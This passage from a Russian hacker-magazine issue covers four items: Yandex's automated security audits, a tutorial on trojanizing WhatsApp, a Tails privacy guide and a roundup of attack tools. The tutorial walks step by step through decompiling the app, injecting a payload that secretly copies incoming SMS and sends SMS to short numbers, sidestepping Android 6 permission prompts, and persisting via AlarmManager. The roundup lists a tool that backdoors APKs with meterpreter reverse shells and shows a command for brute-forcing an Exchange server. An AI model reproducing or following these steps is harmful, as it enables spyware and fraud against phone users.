чается совсем вслепую. Хотя, может, попробуешь
OOB-вектор в MS SQL?                                                               reg.ru/nettools/dig
   Ну, на сегодня хватит. Подписывайся на канал,
ставь лайки, вот это всё ;).
ВЗЛОМ: Колонка Тараса Иващенко





      КАК МЫ
 АВТОМАТИЗИРОВАЛИ
АУДИТ БЕЗОПАСНОСТИ
   В «ЯНДЕКСЕ»





                         Тарас Иващенко


Программисты «Яндекса» одновременно разрабатывают
и поддерживают массу сервисов и приложений. Каждое
из них нужно тщательно проверять на секьюрити-баги пе-
ред релизом. Задача большая, но есть хорошая новость:
обеспечение безопасности можно свести к типовым про-
цессам. А значит, они легко поддаются автоматизации! Я
руковожу группой продуктовой безопасности «Яндекса».
В этой колонке я поделюсь опытом, как нам удалось уско-
рить и упростить аудит безопасности.



Классическая ситуация: приложение функционально уже готово к релизу, но
остается пройти еще один важный этап цикла разработки — финальный аудит
безопасности. Как сделать его удобным и эффективным и с точки зрения ко-
манды продукта, и с точки зрения ответственных за безопасность? Как умень-
шить влияние аудита на скорость разработки? На эти и другие сопутствующие
вопросы мы попробовали дать ответы, исходя из собственного опыта, на пре-
дыдущей встрече российского отделения OWASP, которая проходила в мо-
сковском офисе «Яндекса».
   Когда обсуждают роль безопасности в цикле разработки программного
обеспечения, то часто ссылаются на методологию от Microsoft.





Здесь все кажется логичным, правильным и, к сожалению, немного утопичным.
Тем не менее это хорошая цель, к которой стоит стремиться, внедряя SDL ча-
стями в своей компании. Ведь, как известно, слона лучше есть по частям. В
«Яндексе» внедрением SDL занимается выделенная группа продуктовой без-
опасности. Мы проводим тренинги, пишем внутренние руководства для раз-
работчиков, поддерживаем «Охоту за ошибками», внедряем глобальные кон-
троли и технологии безопасности и, конечно же, стараемся максимально
автоматизировать свою деятельность. В общем, занимаемся множеством ин-
тересных вещей. В их числе — финальный аудит безопасности новых проек-
тов и больших релизов наших сервисов. В качестве основы для методологии
аудита используем OWASP Security Testing Guide с поправками на наши вну-
тренние технологии и специфику. До недавнего времени процесс на верхнем
уровне описания сводился к следующим этапам.
 1. Менеджер продукта заполняет специальную форму, в которой указывает
   различного рода информацию о релизе: краткое описание, ссылки на ис-
   ходный код и тестовую среду, контакты разработчиков и прочее.
 2. Заявка на аудит в виде тикета попадает в единый с разработчиками багтре-
    кер.
 3. Менеджер со стороны группы продуктовой безопасности разбирает этот
   поток и принимает решение о том, как дальше сложится судьба задачи.
 4. Задача попадает к аудитору, и начинается самое интересное.

В этом процессе есть недостатки, влияющие на скорость (и не только) работы.
 1. Промежуточное звено согласования (менеджер со стороны ИБ).
 2. К сожалению, нередко заявки приходят без нужного запаса по времени на
   сами работы.
 3. Мы всё еще находим типовые проблемы безопасности на финальной ста-
   дии.
 4. Финальный аудит становится «бутылочным горлышком» для цикла разра-
    ботки.

Это все причиняло нам и самим сервисам постоянную боль. Мы подумали и
решили, что нужно что-то делать! Во-первых, нам, конечно же, необходимо
сдвигать задачи, связанные с ИБ, ближе к началу цикла разработки. Это оче-
видно. Во-вторых, мы любим автоматизацию, и самое время ей вновь занять-
 ся. Для этого нам понадобится новая суперформа для приема заявок на аудит
безопасности, а также помощь наших «роботов».





Для начала мы подумали: почему бы не добавить полноценный опросник
в форму и не давать рекомендации сразу же по мере ее заполнения? Сказа-
но — сделано. Мы добавили вопросы про возможную специфичную (и связан-
ную с рисками) функциональность и повязали их с нашими внутренними ру-
ководствами для разработчиков. То, что мы перешли, по сути, от статической
формы к динамической, позволило подгружать по мере ее заполнения вопро-
 сы, соответствующие ситуации. Например, для мобильных приложений мы
спрашиваем про платформоспецифичные настройки безопасности.





Получается, что мы не возлагаем все надежды на финальный аудит безопас-
 ности, но стараемся использовать его максимально, в том числе и для вне-
дрения наших глобальных систем контроля и защитных технологий. К пер-
вым относятся различного рода автоматизированные сканеры безопасности
веб-приложений и анализ кода, а ко вторым, например, Content Security Policy,
который мы сейчас внедряем повсеместно.
   Также стоит упомянуть HTTPS/TLS (про особенности его внедрения мы
рассказывали на YaC в 2014 году), но его мы внедрили во всех наших продук-
 тах, и вопрос в анкете носит скорее формальный характер.
   Если менеджер отвечает в анкете, что какая-то из требуемых технологий
еще не внедрена в его сервисе, то автоматически заводится соответствую-
щий тикет на внедрение. Напрашивается закономерный вопрос: а что, если
менеджер ответит не совсем честно? Получается, что внедрения контроля не
будет? Мы это все равно выясним в рамках непосредственно аудита, а анкета
 (и автоматический тикет) позволяют сэкономить время. Также важно заметить,
 что культура информационной безопасности в нашей компании находится на
достаточно высоком уровне и каких-то видимых на радарах проблем с правди-
востью ответов на вопросы анкеты нет.

Следующий этап: форма заполнена и попадает в виде тикета в багтрекер. Но
 туда больше не приходит менеджер ИБ! Его место занял наш вежливый робот,
которого мы назвали C-3PO.





Для начала C-3PO нормализует и валидирует содержимое тикета (указали ли
всю необходимую информацию?). Затем на основе ответов в опроснике он
создает задачи для соответствующего сервиса, например инициировать вне-
дрение Molly (наш сканер безопасности веб-приложений, про который мы
рассказывали на ZeroNights 2015 — PDF), а также запускает наши инструмен-
ты анализа защищенности: сканеры и анализаторы кода. Завершив свою ра-
 боту, они вернутся в наш тикет, но уже с результатами. Запуск инструментов
при обработке заявки на аудит позволяет получить самые свежие данные от
 них. Основной же робот переходит к ответственной фазе работы, а именно
прогнозированию рисков соответствующего запуска с точки зрения безопас-
 ности. Прямо сейчас он использует для этого следующие факторы:
•  статус внедрения наших контролей в сервисе;
•  какие были последние результаты использования наших инструментов, мно-
   го ли было обнаружено проблем безопасности и какого рода;
•  когда был последний аудит безопасности и были ли в его рамках обнаруже-
   ны проблемы безопасности;
•  общая «карма» сервиса, которая у нас накапливается на специальном сер-
   висе под названием «Ампельманн»;
•  собственно ответы на вопросы в форме — например, есть ли в запуске ка-
   кая-либо критичная с точки зрения ИБ функциональность.

Таким образом, при оценке рисков мы учитываем как историю безопасности
сервиса, так и особенности конкретного запуска.





Под конец робот назначает задачу на специалиста группы продуктовой безо-
пасности, который и будет отвечать за дальнейшие действия. При этом учиты-
вается его текущая доступность (в отпуске он или нет) и набор компетенций.
Вот что мы получили в итоге всех оптимизаций и автоматизаций:
•  на вход поступает более тщательно подготовленная задача;
•  предварительно оцениваются риски;
•  результаты сканирования на уязвимости всегда свежие;
•  менеджеры и разработчики получают рекомендации одновременно с за-
   полнением формы;
•  у нас есть еще одна возможность контроля;
•  все вместе ускорило процесс.

Все изложенное можно обобщить до одного совета: старайтесь максималь-
но автоматизировать поддающиеся этому процессы, и вы сможете освобо-
дить больше времени на более комплексные проекты. Более ранний контроль
в рамках цикла разработки — не исключение!
ВЗЛОМ
ЛОМАЕМ СОФТ
ДЛЯ ANDROID





  Евгений Зобнин
  zobnin@gmail.com





ЧАСТЬ 2.
ВНЕДРЯЕМ МАЛВАРЬ
В ЛЕГИТИМНОЕ ПРИЛОЖЕНИЕ





В прошлый раз мы разобрались, как взламывать прило-
жения для Android. В большинстве случаев сделать это
очень легко. Сегодня мы пойдем намного дальше и мо-
дифицируем одно очень известное приложение, заставив
его сливать на сторону все входящие СМС и отправлять
СМС на короткие номера. И опять же сделать это будет
совсем нетрудно.

Напомню, что с прошлого набега на чужой софт у тебя
должны были остаться несколько инструментов, а также
алиасы в ~/.bashrc, необходимые для их быстрого запуска.
Все это пригодится тебе и сегодня. Кроме того, в этот раз                                               WARNING
тебе понадобится среда разработки Android Studio. В ста-
тье я буду исходить из предположения, что сама Android        Эта статья вовсе
Studio установлена в  каталог  ~/Android/android-studio,      не призыв к действию
                                                                        и не руководствоа SDK, то есть набор компиляторов и инструментов сбор-                                                                     начинающего создателя
ки, — в каталог ~/Android/android-sdk-linux.                       малвари. Единственная
   Что касается софта, который мы будем препариро-     ее задача — рассказать,
                                                                                   как на самом делевать, я предлагаю остановиться на WhatsApp — мега-                                                                           работают вирусы,
популярном приложении, которое входит в топ-10 всех                                                                         встроенные в хакнутый
магазинов приложений за все времена и, конечно же,      софт, и предупредить
нередко становится целью хакеров, внедряющих в него     тебя, чем может грозить
                                                                                установка вареза
самые разные гадости. Так что статья получится более                                                                          на смартфон. В общем,
чем наглядной.                                            мы белые и пушистые,
                                                                           а если кто-то подумает
                                                                                 иначе, он заведомоИЩЕМ ТОЧКУ ВХОДА                                                                            неправ и вообще
Как и в прошлый раз, идем на apkpure.com, вбиваем      нехороший человек.
в строку поиска адрес WhatsApp в Google Play и скачи-
ваем пакет APK. Для удобства переименовываем его
в whatsapp.apk и перемещаем в каталог ~/tmp. Всю дальнейшую работу мы бу-
дем вести в нем.
   Следующий шаг — найти наилучшее место для внедрения нашего зловред-
ного кода. По объективным причинам такое место — это самое начало кода
приложения, и если бы мы имели дело с обычной настольной Java, то это был
бы метод main() главного класса приложения. Однако в Android исполнение
приложения начинается не с main(). Фактически у здешнего софта вообще
нет единой точки входа, оно состоит из множества компонентов, каждый из ко-
торых может получить управление при возникновении того или иного события.
   Если мы хотим, чтобы наш код запускался при старте приложения с рабо-
чего стола, нам нужно вставить его в класс, получающий управление при воз-
никновении события (если быть точным, это называется «интент») android.
intent.action.MAIN категории android.intent.category.LAUNCHER. Чтобы
найти этот класс, придется дизассемблировать WhatsApp с помощью apktool
и прочитать файл AndroidManifest.xml:

$ apktool d whatsapp.apk
$ less whatsapp/AndroidManifest.xml





Искомый класс носит имя com.whatsapp.Main. Открываем ~/tmp/whatsapp/
smali/com/whatsapp/Main.smali и ищем метод OnCreate():





Это и есть искомая точка входа. C этого метода начинается исполнение гра-
фического Android-приложения, когда оно получает интент android.intent.
action.MAIN, другими словами — когда юзер тапает по иконке приложения
пальцем. В этот метод мы будем внедрять наш payload.

ПИШЕМ PAYLOAD
Какой же код мы внедрим в WhatsApp? Для начала заставим его вывести
на экран сообщение «Hi from malware!». Очень простая в реализации функция,
которая позволит быстро проверить, что все работает так, как мы и рассчиты-
вали. Если ты читал прошлую часть, то уже должен догадаться, как это сделать.
Но не стоит торопиться, в этот раз мы не будем вставлять в код отдельные ку-
ски smali-кода, а вместо этого создадим отдельный класс, методы которого
уже и будем вызывать из кода WhatsApp. Такой подход гораздо более удобен
и позволяет как угодно расширять функциональность приложения, внося в его
оригинальный код минимальные изменения.
   Итак, открываем Android Studio, создаем новый проект, в поле Application
name пишем Whatsapp, а в поле Company domain — com. Таким образом сре-
да разработки сама разместит наш класс в пакете com.whatsapp, точно так же,
как в оригинальном приложении. При выборе типа активности (Add an activity)
выбираем Add No Activity. В левой части экрана разворачиваем список app
java   com.whatsapp и с помощью правой кнопки мыши создаем новый класс
Payload. Добавляем в него следующие строки:





                                                       Простейший payload

Это и есть наш класс с единственным статическим методом, выводящим
на экран сообщение. Теперь класс необходимо скомпилировать и транслиро-
вать в байт-код Dalvik. С помощью среды разработки без танцев с бубном это
не получится, поэтому сделаем все из командной строки.
   Для начала создадим в ~/tmp структуру каталога, аналогичную оригиналь-
ному приложению, и скопируем в нее исходный код класса:

$ mkdir -p com/whatsapp
$ cp ~/AndroidstudioProjects/Whatsapp/app/src/main/java/com/
    whatsapp/Payload.java com/whatsapp

Теперь скомпилируем его и транслируем в код Dalvik:

$ javac -classpath ~/Android/android-sdk-linux/platforms/
    android-23/android.jar com/whatsapp/*.java
$ ~/Android/android-sdk-linux/build-tools/23.0.3/dx --dex
    --output=Payload.dex com/whatsapp/*.class

Обрати внимание на android-23 и 23.0.3 в путях: чтобы они существовали,
у тебя должен быть установлен SDK для Android 6.0 и соответствующие ин-
струменты сборки (при первом запуске Android Studio предложит установить
их сама).
  В текущем каталоге (~/tmp) должен появиться файл Payload.dex. Его не-
обходимо дизассемблировать:

$ baksmali Payload.dex

И скопировать в каталог с ранее дизассемблированным кодом WhatsApp:

$ cp out/com/whatsapp/*.smali whatsapp/smali/com/whatsapp


ВЫЗЫВАЕМ PAYLOAD
Теперь в дизассемблированном коде WhatsApp есть наш класс, осталось
только вызвать его статический метод run(). Чтобы это сделать, достаточно
добавить следующую строку куда-то в начало метода onCreate():



На Java этот код выглядел бы так:


То есть инструкция invoke-static, по сути, имеет такой вид:

invoke-static {аргумент}, Lимя_класса;->имя_метода(тип_аргумента;)
    тип_возвращаемого_значения

Регистр p0, который мы передали в качестве аргумента, всегда ссылается
на текущий объект и эквивалентен ключевому слову this в Java. Текущий объект
в данном случае имеет класс Activity, мы передаем его методу run() нашего
класса, чтобы он смог использовать его для вывода сообщения на экран.





                                              Метод OnCreate() с нашим кодом

Все, осталось только собрать
WhatsApp обратно в APK и подписать
тестовым ключом:

$ cd ~/tmp/whatsapp
$ apktool b
$ cd ..
$ cp whatsapp/dist/whatsapp.apk
    whatsapp-payload.apk
$ sign whatsapp-payload.apk

Полученный файл whatsapp-
payload.s.apk закидываем на карту
памяти и устанавливаем.


                                              Сработало!

ИДЕМ ДАЛЬШЕ
Какой же это зловред, если вместо кражи личной информации он только и де-
лает, что сообщает о себе? Полностью согласен, поэтому сейчас мы суще-
ственно расширим возможности нашего payload. Он никак не будет выдавать
своего присутствия, а вместо этого просто скинет все входящие СМС в файл
на карте памяти:





Данный код читает базу данных СМС и записывает на карту памяти красивый
текстовый файл sms.txt, содержащий СМС в формате:

From: номер
Date: дата
Body: текст

При необходимости код можно дополнить, чтобы файл сразу сливался на уда-
ленный сервер, а затем уничтожался, дабы не оставлять следов. Чтобы код за-
работал, в манифест приложения (~/tmp/whatsapp/AndroidManifest.xml)
необходимо добавить разрешение на чтение СМС:



Далее остается только скомпилировать класс, перегнать в smali, скопировать
в приложение, собрать и подписать его, так же как мы делали это в предыду-
щем разделе. Организовать отправку СМС на короткий номер и того проще:





Причем  в этом  случае даже не надо  править
AndroidManifest.xml —  права  на  отправку
СМС у WhatsApp уже есть.
  В целом все просто, но есть одно большое но!
Дело в том, что два приведенных выше куска кода
будут отлично работать только до тех пор, пока ты
не установишь хакнутый WhatsApp на смартфон под
управлением Android 6.0 и выше. А тогда прило-
жение упадет на старте, и причина в том, что «ше-
стерка» требует явного запроса прав (в том числе
на чтение СМС и запись на карту памяти) перед тем,
как функции, защищенные этими правами, будут ис-
пользованы.
  И здесь мы попадаем в одну не очень приятную
ситуацию. Запросить-то права мы можем, вот только
сама система запроса права реализована не в нашу
пользу, потому как событие «Пользователь нажал
на „Да“» может быть обработано только активностью
приложения с помощью колбэка onRequestPermissionsResult(). Другими
словами, придется вносить изменения в сам Main.smali.
  Но есть способ проще и тупее. На самом деле нам совсем необязательно
дожидаться, пока юзер нажмет кнопку «Да» или «Нет», после нажатия система
так или иначе либо даст разрешение на выполнение операции, либо запретит,
поэтому мы можем просто подождать и после этого проверить, есть ли у нас
нужные права:





Данный код проверяет, запущен ли он в Android 6 или выше (API 23), и если да,
то запускает код запроса разрешений на чтение СМС и запись на карту памя-
ти, затем засыпает на десять секунд, а просыпаясь, проверяет, есть ли права
(то есть нажал ли юзер «Да»). Если есть — отрабатывает уже знакомый нам
код, нет — ничего не происходит.
   Профессиональные программисты сожрут меня живьем за усыпление ос-
новного потока приложения, но мы здесь не в чемпионате на правильный код
участвуем, главное, чтобы payload отработал, на остальное наплевать.

ПЕРИОДИЧЕСКИЕ ЗАДАЧИ
Проблема текущей реализации payload в том, что он будет запущен только во
время холодного старта приложения, то есть при первом запуске, запуске по-
сле перезагрузки либо после того, как приложение будет вытеснено из памяти
системой. Для одноразовой задачи это нормально, но что, если нам необхо-
димо, чтобы наш зловред работал в фоне?
   Для этого можно использовать сервис, то есть специальный поток, ко-
торый будет висеть в фоне и делать нужную нам работу. Однако для на-
шей задачи это слишком избыточное решение. Гораздо удобнее исполь-
зовать AlarmManager — специальную подсистему  Android, позволяющую
запускать нужный код через определенные интервалы. В отличие от сервисов
AlarmManager не требует модификации AndroidManifest, достаточно просто
привести код класса Payload к следующему виду:





Метод run() устанавливает Alarm, который должен срабатывать каждую мину-
ту (60 * 1000 мс) и запускать код, указанный в методе onReceive(). Красота
этого подхода в том, что после установки Alarm’а он будет срабатывать вне за-
висимости от того, запущено ли приложение. То есть, если пользователь запу-
стил хакнутый WhatsApp, а затем закрыл его, а система завершила WhatsApp
при нехватке памяти, он вновь будет запущен в фоне, когда сработает Alarm.

ВЫВОДЫ
Как видишь, внедрить собственный код в чужое приложение не просто реаль-
но, а реально настолько, что с этой задачей справится даже ребенок. Все, что
нужно, — знать основы программирования для Android и чуть-чуть понимать
код smali. И тогда открываются просто безграничные возможности модифика-
ции других приложений. К примеру, можно реализовать систему загрузки пол-
ноценных плагинов, о чем я уже писал, или даже получить root, скачать и уста-
новить APK с вирусом в системный раздел.
   За сим откланиваюсь, встретимся в следующей статье цикла.
ВЗЛОМ
ФЛЕШБЛЕК
 ИСПОЛЬЗУЕМ ФЛЕШКУ
 С ДИСТРИБУТИВОМ
 TAILS, ЧТОБЫ
 ПОЛНОСТЬЮ СКРЫТЬ
 СЛЕДЫ СВОЕЙ
 ДЕЯТЕЛЬНОСТИ.





Tor, безусловно, одно из самых нужных
средств защиты личных данных. Но чтобы
обезопасить себя со всех сторон и работать,

                                                                                   Тарас Татаринов,не оставляя вообще никаких следов, нуж-                                                                                                эксперт по ИБ АО
                                                                                     «Монитор Безопасности»но намного больше. Tails — операционная
система семейства Debian Linux, основан-
ная на серьезных принципах защиты данных. Используя
флешку с Tails, ты можешь не опасаться не только слежки
в интернете, но и обыска в квартире.


Tails — не единственный дистрибутив Linux, который ставит защиту данных во
главу угла. Но, на мой взгляд, это на сегодняшний день лучший выбор для че-
ловека, желающего сохранить конфиденциальность переписки, защищен-
ность личных данных и сохранность важной информации от любопытных глаз.
И раз уж я заговорил о принципах защиты данных в Tails, то нелишне будет их
перечислить.
1. Сохранение конфиденциальности информации. Здесь все просто, нам не-
   обходимо защитить нашу информацию от посторонних. Для этого мы будем
   шифровать всё, использовать криптостойкие алгоритмы и длинные ключи.
   Что-то даже будем шифровать по нескольку раз. Ничто не должно храниться
   в открытом виде, ничто не передается в открытом виде.
2. Сокрытие наличия информации (стеганографическая защита). Нам необхо-
  димо скрыть сам факт хранения или передачи данных. Мы будем использо-
   вать скрытые криптоконтейнеры, заполнять свободные места на дисках слу-
   чайными данными, эвристически неотличимыми от зашифрованных данных.
3. Скрытие адресата передачи информации. Иногда может потребоваться
   скрыть от чужих глаз не только саму информацию, но и адресата. В этом нам
   поможет многослойное шифрование и «луковая» маршрутизация.
4. Правдоподобный отказ (plausible deniability). Может возникнуть необходи-
   мость направить настойчивых любопытствующих (к примеру, при досмотре)
   на ложный след. Поверх скрытых контейнеров с важными данными мы соз-
  дадим ложные, но очень правдоподобные зашифрованные разделы, в кото-
   рых будем хранить поваренную книгу и картинки с котами из интернета.
5. Возможность отказаться от факта передачи информации, отозвать свои
  цифровые подписи и так далее. В этом нам поможет протокол OTR и ис-
   пользование HMAC вместо ЭЦП.
6. Работа на компьютере без следов. Все, что может остаться в оперативной
   памяти, на жестком диске или даже в памяти видеокарты, необходимо тща-
   тельно зачистить. Все важное должно сохраниться только на надежно за-
   шифрованном, скрытом и оберегаемом нами носителе, риск утечек должен
   быть сведен к минимуму.

Все эти принципы дополняют друг друга. Если ты действительно озабочен за-
щитой своих данных и сохранением конфиденциальности, не пренебрегай
ни одним из них.

Установка
Для установки Tails нам понадобится две флешки. Почему две? Чтобы понять,
что такое рекурсия, нужно сначала понять, что такое рекурсия. А Tails мож-
но установить, только используя Tails. Скачиваем ISO с официального сайта
tails.boum.org. Образ рекомендуется сразу проверить с помощью OpenPGP,
подробная инструкция о том, как это сделать, есть на сайте. Скачанный об-
раз записываем на первую, промежуточную флешку с помощью Universal Usb
Installer. После этого можно выключать компьютер и загружаться с флешки.
Когда ОС загрузится, нужно будет вставить вторую (основную) флешку и вы-
брать Applications    Tails    Tails Installer Install by Cloning.





Если все получилось, то система готова к работе.

Начало работы
После  загрузки  с  рабочей
флешки нам потребуется со-
здать постоянный  (persistent)
защищенный   раздел,   сво-
еобразный   «жесткий   диск
на  флешке».  Это  делается
через  Application      Tails
Configure Persistence.
   Перезагружаем компьютер
и на загрузочном экране вы-
бираем Use Persistence и More
Options, после чего вводим па-
роль для нашего хранилища.
  Из меню внизу экрана вы-
бираем  регион.  Это  важно,
поскольку от региона зависят
входные узлы Tor. Здесь следу-
ет поэкспериментировать. В моем случае лучшим выбором оказалась Дания.
  В меню расширенных настроек задаем пароль для программ, которым нуж-
ны права администратора. Можешь поставить любой, он работает в рамках
сессии и ни на что больше не влияет.





Имей в виду, что загрузка занимает некоторое время, а потом Tails еще не-
сколько минут будет подключаться к Tor. Отслеживать процесс можно, щел-
кнув по иконке Onion Circuits — луковичке в верхнем правом углу экрана.





Спустя некоторое время Tails проинформирует об успешном подключении
к Tor. По умолчанию сеть сконфигурирована так, что весь трафик будет прохо-
дить через него. Теперь можно скачать все, что нам нужно для работы.

Дополнительное ПО, сохранение файлов и настроек
По умолчанию Tails не рассчитана на сохранение установленного ПО, настро-
ек и файлов после выключения компьютера. Однако создатели предусмотрели
возможность хранить некоторые данные в персистентном разделе. Настроить,
что именно будет храниться, можно в разделе Settings   Persistent.





Большинство пунктов меню очевидны, поэтому я остановлюсь на последних
трех. Второй и третий с конца отвечают за хранение APT-пакетов. Tails ос-
нована на Debian, поэтому большинство нужного нам ПО можно установить
при помощи apt-get. И хотя сами программы при отключении компьютера
не сохранятся, пакеты APT при соответствующих настройках останутся в пер-
систентном разделе. Это позволяет развертывать все нужное ПО в процессе
загрузки системы.
   Последний пункт меню Dotfiles позволяет создать в персистентном разде-
ле папку с файлами, ссылки на которые будут создаваться в домашней папке
Tails при загрузке. Выглядит это следующим образом.
   Вот пример структуры файлов в постоянном разделе.

/live/persistence/TailsData_unlocked/dotfiles
├── file_a
├── folder
│   ├── file_b
│   └── subfolder
│       └── file_c
└── emptyfolder

В домашней папке при таком раскладе будет следующая структура ссылок:

/home/amnesia
├── file_a → /live/persistence/TailsData_unlocked/dotfiles/
│              file_a
└── folder
    ├── file_b → /live/persistence/TailsData_unlocked/
    │             dotfiles/folder/file_b
    └── subfolder
        └── file_c → /live/persistence/TailsData_unlocked/
                      dotfiles/folder/subfolder/file_c


Защищаем данные,
отбрасываем хвост
Сам по себе наш персистент-
ный раздел уже зашифрован.
Однако у него есть существен-
ный недостаток: он не обеспе-
чивает правдоподобное отри-
цание наличия зашифрованных
данных.  Чтобы   обеспечить
правдоподобное   отрицание,
я предложу решение, которое
отличается  от рекомендаций
создателей Tails. Как поступить
тебе — решай сам.
   Создатели  Tails  рекомен-
дуют использовать cryptsetup,
основанный на LUKS. Эта про-
грамма  позволяет  создавать
скрытые разделы, однако та-
кой раздел скрыт не до конца.
Насколько мне известно,  су-
ществует возможность обнару-
жить заголовок скрытого раз-
дела, что позволяет установить
его наличие.
   Такой скрытый раздел лично
меня не устраивает. Поэтому
я решил использовать старый
добрый TrueCrypt версии 7.1а.
Заголовок  скрытого  раздела
TrueCrypt неотличим  от  слу-
чайных данных,  и, насколько
мне известно, обнаружить его
невозможно. Двоичный файл
программы TrueCrypt лучше хранить здесь же, в персистентном разделе.
   Детально описывать процесс создания двойного криптоконтейнера я
не стану, отмечу лишь важный нюанс. Поскольку скрытый раздел TrueCrypt
по-настоящему скрытый, о его существовании не догадывается даже сама
программа, пока ты не введешь нужный пароль. Из-за этого при записи фай-
лов в ложный раздел скрытый раздел может быть поврежден. Чтобы этого
не произошло, при монтировании ложного раздела для записи на него кар-
тинок котиков нужно выбрать Mount Options    Protect hidden volume when
mounting outer volume.
  Подобно ящерице, которая при опасности отбрасывает свой хвост, мы те-
перь в случае необходимости сможем ввести пароль от фальшивого раздела
и продемонстрировать всем фотографии котиков вместо конфиденциальной
информации.

Общение
Теперь, когда мы обезопасили нашу информацию, можно приступить к ее пе-
редаче, то есть к общению. Начнем с Pidgeon. Он отлично годится в качестве
клиента IRC, а в Tails его еще и немного усилили. В состав ОС включен Pidgeon
с установленным плагином для протокола OTR. Именно он нам интересен
больше всего. Избегая сложной математики, можно сказать, что этот прото-
кол обеспечивает защищенную передачу данных с возможностью отречения,
то есть доказать, что конкретное сообщение написано конкретным человеком,
невозможно.
  Прежде чем начать общаться с кем-то по протоколу OTR, нужно подключить-
ся к серверу IRC. При этом очень важно удостовериться в использовании SSL.
Tor шифрует трафик при пе-
редаче его между узлами, но,
если ты не будешь использо-
вать SSL, твой трафик будет
передаваться в открытом виде
до входного узла Tor и от вы-
ходного узла адресату. Некото-
рые узлы Tor забанены на сер-
верах  IRC,  поэтому  может
потребоваться перезапуск Tor.
Сделать это можно командой /
etc/init.d/tor restart.
   После того как соединение
с сервером установлено, вы-
бираем Buddies   New Instant
Message.
  В открывшемся окне диало-
га выбираем Not Private    Start
Private Conversation.





Будет предложено три варианта для аутентификации: ввести ответ на секрет-
ный вопрос, который вы обсудили с собеседником заранее (в этом случае не-
обходимо ввести один и тот же ответ, пробелы и регистр считаются); ввести
общую «секретную» фразу; проверить fingerprint — это сорокасимвольная по-
следовательность, идентифицирующая пользователя OTR.
   Теперь  можно  переписы-
ваться по OTR. Но как насчет
голосового   общения?    Тут,
увы, не все гладко. Посколь-
ку  Tails направляет весь тра-
фик через Tor, возникает ряд
проблем для голосового об-
щения.  Во-первых, большин-
ство VoIP-программ использу-
ют UDP, в то время как через
Tor возможна передача толь-
ко пакетов TCP. Во-вторых, Tor
не отличается скоростью и па-
кеты иногда приходят с сильной
задержкой. Так что возможны
задержки и разрывы связи.
  Тем  не менее  существу-
ет  OnionPhone, специальный
плагин для TorChat. Неплохо
справляется и Mumble, хотя этот вариант и менее безопасен. Чтобы Mumble
работал через Tor, необходимо запускать его командой torify mumble, а так-
же выбрать пункт Force TCP в сетевых настройках программы.

Электронная почта
Почту в Tails можно использовать точно так же, как и в других ОС. В стандарт-
ную сборку входит почтовый клиент Icedove, его настройки и ключи можно хра-
нить в персистентном разделе. Важный нюанс, который следует иметь в виду
при отправке писем, состоит в том, что заголовки (subject) не шифруются. Это
не ошибка, а особенность реализации протокола, о которой нужно просто
знать. Кроме того, файлы, передаваемые по электронной почте, рекомендует-
ся шифровать.

Итого
Я описал лишь некоторые возможности Tails, но базовая сборка содержит вну-
шительный набор дополнительных программ, которые тебе предстоит изучить
самостоятельно. Рекомендую, к примеру, посмотреть софт для стирания ме-
таданных файлов — он поможет тебе обезопасить себя еще лучше.
ВЗЛОМ





                                 Дмитрий «D1g1» Евдокимов,
                                                                Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                     ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!





                 APK С ПОДАРКОМ
                      Сегодня  соорудить  вредоносное  приложение
                       для ОС Android не составляет никакого труда. Сле-
                    дующий shell-скрипт просто доводит это до уровня
                        детского сада.
                           Backdoor-apk одной простой командой добавля-
                          ет собственный backdoor в любой APK-файл — за-
                         навес! Единственное, что необходимо, — сформи-
                        ровать нужное окружение для программы, чтобы она
                       выполнила свои функции. Для этого на Linux-маши-Автор:
                       не потребуется наличие Metasploit, Apktool, AndroidDana James Traversie
                      SDK, smali.
                       На данный момент в инструменте реализованаURL:
                         вставка следующих полезных нагрузок:github.com/dana-at-cp/
                         •  meterpreter/reverse_http;backdoor-apk
                         •  meterpreter/reverse_https;
                         •  meterpreter/reverse_tcp;Система:
                         •  shell/reverse_http;Linux
                         •  shell/reverse_https;
                         •  shell/reverse_tcp.

                     Все это очень знакомо и функционально. Так что
                        сегодня любой школьник может скачать нужную APK
                        из Google Play и вставить в нее backdoor. А затем
                       стащить твой телефон со стола и заменить нормаль-
                      ное приложение на протрояненное, и ты этого даже
                       не заметишь.




                АНАЛИЗ УТЕЧЕК ИНФОРМАЦИИ
                            AIL — это модульный фреймворк для анализа потен-
                        циальных утечек информации в различных неструк-
                        турированных открытых источниках данных. Напри-
                        мер, таком, как Pastebin. Благодаря своей гибкости
                            AIL очень просто расширяется (модули на Python)
                       новой функциональностью для обработки различ-
                       ной критичной информации. А благодаря крутому
                       веб-интерфейсу он очень удобен и прост в работе.
                     Большое количество различных схем и дашбордовАвторы:
                        позволяет быстро находить и анализировать нуж-Computer Incident Response
                      ную информацию. Center Luxembourg
                     Особенности:
                         •  модульная архитектура для обработки потоковURL:
                           структурированной и неструктурированной ин- github.com/CIRCL/AIL-
                         формации; framework
                         •  дефолтная поддержка сторонних ZMQ feeds, та-
                             ких провайдеров, как CIRCL, и многих других;Система:
                         •  каждый модуль может обрабатывать и перераба- Linux
                            тывать всю информацию, уже обработанную AIL;
                         •  обнаружение и извлечение URL, включая их гео-
                          графическое положение (местоположение IP-а-
                             дреса);
                         •  извлечение и валидация потенциальных утечек
                         номеров кредитных карт;
                         •  извлечение и валидация утекших почтовых адре-
                              сов, включая валидацию DNS MX;
                         •  модуль извлечения .onion-адресов Tor (для даль-
                         нейшего анализа);
                         •  извлечение   и   валидация   потенциальных
                            hostnames;
                         •  модуль полнотекстовой индексации для индек-
                          сации неструктурированной информации.




                 АТАКУЕМ EXCHANGE-СЕРВЕР
                           Ruler — это инструмент на языке программирования
                   Go для взаимодействия с Exchange-сервером через
                       MAPI/HTTP-протоколы. Основное его предназначе-
                      ние — злоупотребление возможностями почтовых
                       правил на стороне Outlook-клиента, как описано
                        в блоге SilentBreak. Все это и автоматизирует Ruler.
                   Возможности программы:
                         •  перечисление валидных пользователей;
                         •  просмотр текущих правил конфигурации почты;
Авторы:                         •  создание новых вредоносных правил для почты;SensePost
                         •  удаление почтовых правил.
URL:                    При этом Ruler пытается в полуавтоматическом ре-github.com/sensepost/ruler
                    жиме взаимодействовать с Exchange и использо-
                         вать сервис Autodiscover для обнаружения необхо-
Система:                     димой информации.Linux/Windows
                       Пример bruteforce-атаки:

                        # ./ruler -domain evilcorp.ninja -brute
